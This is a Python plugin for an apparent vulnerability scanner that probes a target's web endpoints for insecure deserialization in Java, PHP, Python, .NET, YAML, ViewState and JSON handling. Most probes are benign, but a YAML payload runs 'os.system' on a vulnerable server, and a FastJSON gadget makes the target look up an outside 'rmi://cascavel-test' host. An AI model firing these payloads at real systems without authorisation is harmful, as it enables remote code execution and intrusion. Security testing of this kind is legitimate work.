# plugins/deserialization_scan.py — Cascavel 2026 Intelligence
import base64
import re

import requests

ENDPOINTS = [
    "/",
    "/api/",
    "/api/v1/",
    "/import",
    "/upload",
    "/deserialize",
    "/object",
    "/data",
    "/api/import",
    "/api/data",
    "/webhook",
    "/callback",
]

# ──────────── DESERIALIZATION PAYLOADS (2026) ────────────
JAVA_PAYLOADS = [
    {
        "nome": "JAVA_SERIAL_HASHMAP",
        "data": base64.b64decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="),
        "content_type": "application/x-java-serialized-object",
        "indicadores": [
            "java.",
            "ClassNotFoundException",
            "ObjectInputStream",
            "serialVersionUID",
            "InvalidClassException",
        ],
    },
    {
        "nome": "JAVA_YSOSERIAL_PROBE",
        "data": base64.b64decode("rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMu"),
        "content_type": "application/x-java-serialized-object",
        "indicadores": ["commons", "collections", "transformer", "InvocationTargetException"],
    },
]

PHP_PAYLOADS = [
    {
        "nome": "PHP_SERIAL_STDCLASS",
        "data": 'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
        "content_type": "application/x-www-form-urlencoded",
        "indicadores": ["unserialize", "stdClass", "__wakeup", "__destruct", "allowed_classes"],
    },
    {
        "nome": "PHP_PHAR_PROBE",
        "data": "phar://test.phar",
        "content_type": "text/plain",
        "indicadores": ["phar", "PharException", "stream_wrapper"],
    },
]

PYTHON_PAYLOADS = [
    {
        "nome": "PYTHON_PICKLE",
        "data": base64.b64encode(b"\x80\x04\x95\x05\x00\x00\x00\x00\x00\x00\x00\x8c\x01X\x94.").decode(),
        "content_type": "application/octet-stream",
        "indicadores": ["pickle", "unpickle", "cPickle", "Unpickler", "_pickle", "UnpicklingError"],
    },
]

DOTNET_PAYLOADS = [
    {
        "nome": "DOTNET_BINARYFORMATTER",
        "data": "AAEAAAD/////",
        "content_type": "application/octet-stream",
        "indicadores": ["BinaryFormatter", "SerializationException", "TypeLoadException", "System.Runtime"],
    },
]

YAML_PAYLOADS = [
    {
        "nome": "YAML_DESERIALIZATION",
        "data": "!!python/object/apply:os.system ['id']",
        "content_type": "text/yaml",
        "indicadores": ["yaml", "constructor", "tag:yaml.org", "ConstructorError"],
    },
]


def _test_payload(url, payload):
    """Testa um payload de deserialization."""
    try:
        data = payload["data"]
        resp = requests.post(
            url,
            data=data if isinstance(data, bytes) else str(data),
            timeout=5,
            headers={"Content-Type": payload["content_type"]},
        )
        for indicator in payload["indicadores"]:
            if indicator.lower() in resp.text.lower():
                return {
                    "tipo": "INSECURE_DESERIALIZATION",
                    "tecnologia": payload["nome"],
                    "indicador": indicator,
                    "severidade": "CRITICO",
                    "status": resp.status_code,
                }
        # Check for generic error disclosure
        if resp.status_code == 500 and any(e in resp.text.lower() for e in ["exception", "error", "traceback"]):
            return {
                "tipo": "DESER_ERROR_DISCLOSURE",
                "tecnologia": payload["nome"],
                "severidade": "ALTO",
                "descricao": "Server error 500 com deserialization payload — possível vulnerabilidade!",
            }
    except Exception:
        pass
    return None


def _test_viewstate(url):
    """Testa ViewState (.NET deserialization)."""
    try:
        resp = requests.get(url, timeout=5)
        if "__VIEWSTATE" in resp.text:
            viewstate = re.search(r'__VIEWSTATE[^>]*value="([^"]+)"', resp.text)
            vs_size = len(viewstate.group(1)) if viewstate else 0

            vuln = {
                "tipo": "VIEWSTATE_DETECTADO",
                "endpoint": url,
                "severidade": "MEDIO",
                "tamanho": vs_size,
                "descricao": "ASP.NET ViewState presente",
            }

            # Check for MAC validation
            if viewstate:
                vs_data = viewstate.group(1)
                if len(vs_data) < 100:
                    vuln["severidade"] = "ALTO"
                    vuln["descricao"] = "ViewState pequeno — possível MAC disabled!"

                # Check for ViewState generator
                gen = re.search(r'__VIEWSTATEGENERATOR[^>]*value="([^"]+)"', resp.text)
                if gen:
                    vuln["generator"] = gen.group(1)

            return vuln
    except Exception:
        pass
    return None


def _test_json_deserialization(url):
    """Testa JSON deserialization (Jackson/FastJSON/.NET)."""
    json_payloads = [
        # Jackson polymorphic
        {"@type": "java.net.URL", "val": "http://cascavel-test.com"},
        # FastJSON
        {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "rmi://cascavel-test:1099/obj"},
        # .NET TypeNameHandling
        {"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework"},
    ]
    vulns = []
    for payload in json_payloads:
        try:
            resp = requests.post(url, json=payload, timeout=5)
            if resp.status_code == 500:
                body = resp.text.lower()
                if any(
                    e in body
                    for e in ["jackson", "fastjson", "typeloader", "remoting", "jdbcrowset", "objectdataprovider"]
                ):
                    vulns.append(
                        {
                            "tipo": "JSON_DESERIALIZATION",
                            "severidade": "CRITICO",
                            "descricao": "JSON polymorphic deserialization detected!",
                            "amostra": resp.text[:150],
                        }
                    )
        except Exception:
            continue
    return vulns


def run(target, ip, open_ports, banners):
    """
    Scanner Insecure Deserialization 2026-Grade — Java/PHP/Python/.NET/YAML.

    Técnicas: Java ysoserial probe, PHP stdClass + phar://, Python pickle,
    .NET BinaryFormatter, YAML !!python/object, ViewState analysis
    (MAC validation/generator), JSON polymorphic (Jackson/FastJSON/.NET
    TypeNameHandling), error disclosure detection, 12 endpoints.
    """
    _ = (ip, open_ports, banners)
    vulns = []
    all_payloads = JAVA_PAYLOADS + PHP_PAYLOADS + PYTHON_PAYLOADS + DOTNET_PAYLOADS + YAML_PAYLOADS

    for ep in ENDPOINTS:
        url = f"http://{target}{ep}"

        for payload in all_payloads:
            vuln = _test_payload(url, payload)
            if vuln:
                vuln["endpoint"] = ep
                vulns.append(vuln)

        vs = _test_viewstate(url)
        if vs:
            vulns.append(vs)

        vulns.extend(_test_json_deserialization(url))

    return {
        "plugin": "deserialization_scan",
        "versao": "2026.1",
        "tecnicas": [
            "java_serial",
            "ysoserial",
            "php_serial",
            "phar",
            "python_pickle",
            "dotnet_binary",
            "yaml_deser",
            "viewstate",
            "json_polymorphic",
        ],
        "resultados": vulns if vulns else "Nenhum endpoint de deserialization detectado",
    }
